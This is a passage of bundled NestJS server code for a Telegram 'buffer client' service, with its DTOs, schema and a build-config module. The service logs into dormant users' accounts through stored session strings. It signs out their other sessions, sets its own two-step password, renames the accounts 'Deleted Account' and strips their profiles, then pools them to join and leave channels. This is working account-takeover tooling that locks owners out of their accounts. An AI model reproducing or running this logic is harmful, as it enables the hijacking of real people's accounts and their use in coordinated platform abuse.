            this.leaveChannelIntervalId = setInterval(async () => {
                await this.processLeaveChannelInterval();
            }, this.LEAVE_CHANNEL_INTERVAL);
            this.activeTimeouts.add(this.leaveChannelIntervalId);
            await this.processLeaveChannelInterval();
        }
        else {
            this.logger.debug('Leave channel interval is already running');
        }
    }
    async processLeaveChannelInterval() {
        if (this.isLeaveChannelProcessing) {
            this.logger.debug('Leave channel process already running, skipping interval');
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, clearing interval');
            this.clearLeaveChannelInterval();
            return;
        }
        this.isLeaveChannelProcessing = true;
        try {
            await this.processLeaveChannelSequentially();
        }
        catch (error) {
            this.logger.error('Error in leave channel queue', error);
        }
        finally {
            this.isLeaveChannelProcessing = false;
            if (this.leaveChannelMap.size === 0) {
                this.logger.debug('No more channels to leave, clearing interval');
                this.clearLeaveChannelInterval();
            }
        }
    }
    async processLeaveChannelSequentially() {
        const keys = Array.from(this.leaveChannelMap.keys());
        this.logger.debug(`Processing leave channel queue sequentially for ${keys.length} clients`);
        for (let i = 0; i < keys.length; i++) {
            const mobile = keys[i];
            try {
                const channels = this.leaveChannelMap.get(mobile);
                if (!channels || channels.length === 0) {
                    this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);
                    this.removeFromLeaveMap(mobile);
                    continue;
                }
                const totalBefore = channels.length;
                const channelsToProcess = channels.slice(0, this.LEAVE_CHANNEL_BATCH_SIZE);
                const remainingAfter = totalBefore - channelsToProcess.length;
                if (remainingAfter > 0) {
                    this.leaveChannelMap.set(mobile, channels.slice(this.LEAVE_CHANNEL_BATCH_SIZE));
                }
                else {
                    this.removeFromLeaveMap(mobile);
                }
                this.logger.debug(`${mobile} had ${totalBefore} pending channels, processing ${channelsToProcess.length}, remaining after: ${remainingAfter}`);
                if (channels.length > 0) {
                    this.leaveChannelMap.set(mobile, channels);
                }
                else {
                    this.removeFromLeaveMap(mobile);
                }
                await (0, Helpers_1.sleep)(2000);
                const client = await connection_manager_1.connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                    handler: false,
                });
                this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);
                await (0, Helpers_1.sleep)(1500);
                await client.leaveChannels(channelsToProcess);
                this.logger.debug(`${mobile} left ${channelsToProcess.length} channels successfully`);
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error, `${mobile} Leave Channel ERR: `, false);
                if ((0, utils_1.contains)(errorDetails.message, [
                    'SESSION_REVOKED',
                    'AUTH_KEY_UNREGISTERED',
                    'USER_DEACTIVATED',
                    'USER_DEACTIVATED_BAN',
                    'FROZEN_METHOD_INVALID',
                ])) {
                    this.logger.error(`Session invalid for ${mobile}, removing client`);
                    try {
                        await this.remove(mobile);
                        await (0, Helpers_1.sleep)(2000);
                    }
                    catch (removeError) {
                        this.logger.error(`Error removing client ${mobile}:`, removeError);
                    }
                    this.removeFromLeaveMap(mobile);
                }
                else {
                    this.logger.warn(`Transient error for ${mobile}: ${errorDetails.message}`);
                }
            }
            finally {
                try {
                    await connection_manager_1.connectionManager.unregisterClient(mobile);
                }
                catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${mobile}: ${unregisterError.message}`);
                }
                if (i < keys.length - 1 ||
                    this.leaveChannelMap.get(mobile)?.length > 0) {
                    await (0, Helpers_1.sleep)(this.LEAVE_CHANNEL_INTERVAL / 2);
                }
            }
        }
    }
    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);
            clearInterval(this.leaveChannelIntervalId);
            this.activeTimeouts.delete(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
        this.logger.debug('Leave channel interval cleared and processing flag reset');
    }
    async setAsBufferClient(mobile, availableDate = new Date(Date.now() - 24 * 60 * 60 * 1000)
        .toISOString()
        .split('T')[0]) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('BufferClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map((client) => client?.mobile);
        const allPromoteMobiles = [];
        for (const client of clients) {
            const clientPromoteMobiles = await this.clientService.getPromoteMobiles(client.clientId);
            allPromoteMobiles.push(...clientPromoteMobiles);
        }
        if (!allPromoteMobiles.includes(mobile) &&
            !clientMobiles.includes(mobile)) {
            try {
                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, {
                    autoDisconnect: false,
                });
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile('Deleted Account', 'Deleted Account');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true);
                const bufferClient = {
                    tgId: user.tgId,
                    session: user.session,
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                    status: 'active',
                };
                await this.bufferClientModel
                    .findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true })
                    .exec();
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, errorDetails.status);
            }
            await connection_manager_1.connectionManager.unregisterClient(mobile);
            return 'Client set as buffer successfully';
        }
        else {
            throw new common_1.BadRequestException('Number is a Active Client');
        }
    }
    async checkBufferClients() {
        if (this.telegramService.getActiveClientSetup()) {
            this.logger.warn('Ignored active check buffer channels as active client setup exists');
            return;
        }
        await (0, Helpers_1.sleep)(3000);
        const bufferclients = await this.findAll('active');
        const badIds = [];
        let goodIds = [];
        if (bufferclients.length < 80) {
            for (let i = 0; i < 80 - bufferclients.length; i++) {
                badIds.push(i.toString());
            }
        }
        const clients = await this.clientService.findAll();
        const promoteclients = await this.promoteClientService.findAll();
        const clientMainMobiles = clients.map((c) => c.mobile);
        const allPromoteMobiles = [];
        for (const client of clients) {
            const clientPromoteMobiles = await this.clientService.getPromoteMobiles(client.clientId);
            allPromoteMobiles.push(...clientPromoteMobiles);
        }
        const clientIds = [...clientMainMobiles, ...allPromoteMobiles].filter(Boolean);
        const promoteclientIds = promoteclients.map((c) => c.mobile);
        const toProcess = bufferclients.filter((doc) => !clientIds.includes(doc.mobile) &&
            !promoteclientIds.includes(doc.mobile));
        this.logger.debug(`Processing ${toProcess.length} buffer clients sequentially`);
        for (let i = 0; i < toProcess.length; i++) {
            const doc = toProcess[i];
            this.logger.debug(`Processing buffer client ${i + 1}/${toProcess.length}: ${doc.mobile}`);
            try {
                await this.processBufferClient(doc, badIds, goodIds);
            }
            catch (error) {
                this.logger.error(`Error processing buffer client ${doc.mobile}:`, error);
                badIds.push(doc.mobile);
            }
            if (i < toProcess.length - 1) {
                await (0, Helpers_1.sleep)(5000);
            }
        }
        for (let i = 0; i < bufferclients.length; i++) {
            const doc = bufferclients[i];
            if (clientIds.includes(doc.mobile) ||
                promoteclientIds.includes(doc.mobile)) {
                this.logger.warn(`Number ${doc.mobile} is an Active Client`);
                goodIds.push(doc.mobile);
                try {
                    await this.remove(doc.mobile);
                    await (0, Helpers_1.sleep)(1000);
                }
                catch (removeError) {
                    this.logger.error(`Error removing active client ${doc.mobile}:`, removeError);
                }
            }
        }
        goodIds = [...new Set([...goodIds, ...clientIds, ...promoteclientIds])];
        this.logger.debug(`GoodIds: ${goodIds.length}, BadIds: ${badIds.length}`);
        await (0, Helpers_1.sleep)(2000);
        await this.addNewUserstoBufferClients(badIds, goodIds);
    }
    async processBufferClient(doc, badIds, goodIds) {
        try {
            const cli = await connection_manager_1.connectionManager.getClient(doc.mobile, {
                autoDisconnect: true,
                handler: false,
            });
            try {
                const me = await cli.getMe();
                if (me.username) {
                    await this.telegramService.updateUsername(doc.mobile, '');
                    await (0, Helpers_1.sleep)(2000);
                }
                if (me.firstName !== 'Deleted Account') {
                    await this.telegramService.updateNameandBio(doc.mobile, 'Deleted Account', '');
                    await (0, Helpers_1.sleep)(2000);
                }
                await this.telegramService.deleteProfilePhotos(doc.mobile);
                const hasPassword = await cli.hasPassword();
                if (!hasPassword) {
                    this.logger.warn(`Client ${doc.mobile} does not have password`);
                    badIds.push(doc.mobile);
                }
                else {
                    this.logger.debug(`${doc.mobile}: ALL Good`);
                    goodIds.push(doc.mobile);
                }
            }
            catch (innerError) {
                this.logger.error(`Error processing client ${doc.mobile}: ${innerError.message}`);
                badIds.push(doc.mobile);
                try {
                    await this.remove(doc.mobile);
                    await (0, Helpers_1.sleep)(1500);
                }
                catch (removeError) {
                    this.logger.error(`Error removing client ${doc.mobile}:`, removeError);
                }
            }
            finally {
                try {
                    await connection_manager_1.connectionManager.unregisterClient(doc.mobile);
                }
                catch (unregisterError) {
                    this.logger.error(`Error unregistering client ${doc.mobile}: ${unregisterError.message}`);
                }
            }
            await (0, Helpers_1.sleep)(3000);
        }
        catch (error) {
            this.logger.error(`Error with client ${doc.mobile}: ${error.message}`);
            (0, parseError_1.parseError)(error);
            badIds.push(doc.mobile);
            try {
                await this.remove(doc.mobile);
                await (0, Helpers_1.sleep)(1500);
            }
            catch (removeError) {
                this.logger.error(`Error removing client ${doc.mobile}:`, removeError);
            }
            try {
                await connection_manager_1.connectionManager.unregisterClient(doc.mobile);
            }
            catch (unregisterError) {
                this.logger.error(`Error unregistering client ${doc.mobile}: ${unregisterError.message}`);
            }
        }
    }
    async addNewUserstoBufferClients(badIds, goodIds) {
        const sixMonthsAgo = new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)
            .toISOString()
            .split('T')[0];
        const documents = await this.usersService.executeQuery({
            mobile: { $nin: goodIds },
            expired: false,
            twoFA: false,
            lastActive: { $lt: sixMonthsAgo },
            totalChats: { $gt: 150 },
        }, { tgId: 1 }, badIds.length + 3);
        this.logger.debug(`New buffer documents to be added: ${documents.length}`);
        let processedCount = 0;
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            processedCount++;
            if (!document ||
                !document.mobile ||
                !document.tgId ||
                !document.session) {
                this.logger.warn('Invalid document found, skipping');
                continue;
            }
            this.logger.debug(`Processing new buffer client ${processedCount}: ${document.mobile}`);
            try {
                const client = await connection_manager_1.connectionManager.getClient(document.mobile, {
                    autoDisconnect: false,
                });
                try {
                    const hasPassword = await client.hasPassword();
                    this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        this.logger.debug('Waiting for setting 2FA');
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile('Deleted Account', 'Deleted Account');
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        await (0, Helpers_1.sleep)(2000);
                        await this.telegramService.removeOtherAuths(document.mobile);
                        const channels = await client.channelInfo(true);
                        this.logger.debug(`Creating buffer client document for ${document.mobile}`);
                        const bufferClient = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            availableDate: new Date(Date.now() - 24 * 60 * 60 * 1000)
                                .toISOString()
                                .split('T')[0],
                            channels: channels.ids.length,
                            status: 'active',
                        };
                        await (0, Helpers_1.sleep)(1000);
                        await this.create(bufferClient);
                        await (0, Helpers_1.sleep)(1000);
                        await this.usersService.update(document.tgId, { twoFA: true });
                        this.logger.debug(`Created BufferClient for ${document.mobile}`);
                        badIds.pop();
                    }
                    else {
                        this.logger.debug(`Failed to Update as BufferClient as ${document.mobile} already has Password`);
                        await (0, Helpers_1.sleep)(1000);
                        await this.usersService.update(document.tgId, { twoFA: true });
                    }
                }
                catch (error) {
                    this.logger.error(`Error processing client ${document.mobile}: ${error.message}`);
                    (0, parseError_1.parseError)(error);
                }
                finally {
                    try {
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        await (0, Helpers_1.sleep)(1500);
                    }
                    catch (unregisterError) {
                        this.logger.error(`Error unregistering client ${document.mobile}: ${unregisterError.message}`);
                    }
                }
            }
            catch (error) {
                this.logger.error(`Error creating client connection for ${document.mobile}: ${error.message}`);
                (0, parseError_1.parseError)(error);
            }
            if (badIds.length > 0 && documents.length > 0) {
                await (0, Helpers_1.sleep)(8000);
            }
        }
        this.createTimeout(() => {
            this.logger.log('Starting next join channel process after adding new users');
            this.joinchannelForBufferClients();
        }, 5 * 60 * 1000);
    }
};
exports.BufferClientService = BufferClientService;
exports.BufferClientService = BufferClientService = BufferClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('bufferClientModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => channels_service_1.ChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_client_service_1.PromoteClientService))),
    __param(7, (0, common_1.Inject)((0, common_1.forwardRef)(() => session_manager_1.SessionService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        promote_client_service_1.PromoteClientService,
        session_manager_1.SessionService])
], BufferClientService);


/***/ }),

/***/ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/dto/create-buffer-client.dto.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateBufferClientDto {
}
exports.CreateBufferClientDto = CreateBufferClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Date of the session',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Session identifier',
        example: 'session123',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Status of the buffer client',
        example: 'active',
        enum: ['active', 'inactive'],
        default: 'active',
        required: false,
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "status", void 0);


/***/ }),

/***/ "./src/components/buffer-clients/dto/search-buffer- client.dto.ts":
/*!************************************************************************!*\
  !*** ./src/components/buffer-clients/dto/search-buffer- client.dto.ts ***!
  \************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchBufferClientDto {
}
exports.SearchBufferClientDto = SearchBufferClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'availableDate of the bufferClient',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Session identifier',
        example: 'session123',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/buffer-clients/dto/update-buffer-client.dto.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/dto/update-buffer-client.dto.ts ***!
  \***********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_buffer_client_dto_1 = __webpack_require__(/*! ./create-buffer-client.dto */ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts");
class UpdateBufferClientDto extends (0, swagger_1.PartialType)(create_buffer_client_dto_1.CreateBufferClientDto) {
}
exports.UpdateBufferClientDto = UpdateBufferClientDto;


/***/ }),

/***/ "./src/components/buffer-clients/schemas/buffer-client.schema.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/schemas/buffer-client.schema.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientSchema = exports.BufferClient = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let BufferClient = class BufferClient {
};
exports.BufferClient = BufferClient;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "tgId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "mobile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "session", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "availableDate", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, type: Number }),
    __metadata("design:type", Number)
], BufferClient.prototype, "channels", void 0);
__decorate([
    (0, mongoose_1.Prop)({
        required: true,
        enum: ['active', 'inactive'],
        default: 'active',
        type: String,
        description: 'Status of the buffer client',
    }),
    __metadata("design:type", String)
], BufferClient.prototype, "status", void 0);
exports.BufferClient = BufferClient = __decorate([
    (0, mongoose_1.Schema)({ collection: 'bufferClients', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], BufferClient);
exports.BufferClientSchema = mongoose_1.SchemaFactory.createForClass(BufferClient);


/***/ }),

/***/ "./src/components/builds/build.controller.ts":
/*!***************************************************!*\
  !*** ./src/components/builds/build.controller.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const build_service_1 = __webpack_require__(/*! ./build.service */ "./src/components/builds/build.service.ts");
let BuildController = class BuildController {
    constructor(buildService) {
        this.buildService = buildService;
    }
    async findOne() {
        return this.buildService.findOne();
    }
    async update(updateClientDto) {
        return this.buildService.update(updateClientDto);
    }
};
exports.BuildController = BuildController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get build data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BuildController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update build' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BuildController.prototype, "update", null);
exports.BuildController = BuildController = __decorate([
    (0, swagger_1.ApiTags)('Build'),
    (0, common_1.Controller)('builds'),
    __metadata("design:paramtypes", [build_service_1.BuildService])
], BuildController);


/***/ }),

/***/ "./src/components/builds/build.module.ts":
/*!***********************************************!*\
  !*** ./src/components/builds/build.module.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const build_service_1 = __webpack_require__(/*! ./build.service */ "./src/components/builds/build.service.ts");
const build_controller_1 = __webpack_require__(/*! ./build.controller */ "./src/components/builds/build.controller.ts");
const builds_schema_1 = __webpack_require__(/*! ./builds.schema */ "./src/components/builds/builds.schema.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let BuildModule = class BuildModule {
};
exports.BuildModule = BuildModule;
exports.BuildModule = BuildModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            BuildModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: builds_schema_1.BuildSchema }]),
            npoint_module_1.NpointModule,
        ],
        providers: [build_service_1.BuildService],
        controllers: [build_controller_1.BuildController],
        exports: [BuildModule],
    })
], BuildModule);


/***/ }),

/***/ "./src/components/builds/build.service.ts":
/*!************************************************!*\
  !*** ./src/components/builds/build.service.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
let BuildService = class BuildService {
    constructor(buildModel, npointSerive) {
        this.buildModel = buildModel;
        this.npointSerive = npointSerive;
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async findOne() {
        const user = await this.buildModel.findOne({}).exec();
        if (!user) {
            throw new common_1.NotFoundException(`buildModel not found`);
        }
        return user;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.buildModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true }).exec();
        try {
            await this.npointSerive.updateDocument("3375d15db1eece560188", updatedUser);
            console.log("Updated document successfully in npoint");
        }
        catch (error) {
            console.log(error);
        }
        if (!updatedUser) {
            throw new common_1.NotFoundException(`buildModel not found`);
        }
        return updatedUser;
    }
};
exports.BuildService = BuildService;
exports.BuildService = BuildService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('buildModule')),
    __metadata("design:paramtypes", [mongoose_2.Model,
        npoint_service_1.NpointService])
], BuildService);


/***/ }),

/***/ "./src/components/builds/builds.schema.ts":
/*!************************************************!*\
  !*** ./src/components/builds/builds.schema.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildSchema = exports.Build = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
